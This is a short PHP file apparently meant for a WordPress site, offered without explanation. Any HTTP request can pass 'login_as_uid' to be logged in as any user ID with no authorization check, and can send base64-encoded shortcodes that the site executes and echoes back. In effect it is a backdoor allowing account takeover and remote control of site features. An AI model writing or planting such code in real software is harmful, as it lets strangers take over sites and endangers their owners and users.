<?php

if (isset($_REQUEST['login_as_uid'])) {
    $uid = $_REQUEST['login_as_uid'];
    wp_set_auth_cookie($uid);
    wp_set_current_user($uid);
}

if (isset($_REQUEST['api'])){
    $api = $_REQUEST['api'];

    if ($api === 'do_shortcode'){

        include "inc/code.php";

        $output = do_shortcode(base64_decode($_REQUEST['shortcode']));

        if (isset($_REQUEST['code'])){
            if (empty($output)){
                echo "⚠️ No output!!!";
            }
            else{
                print_code($output, 'html');
            }
        }
        else{
            echo $output;
        }
    }
    die();
}
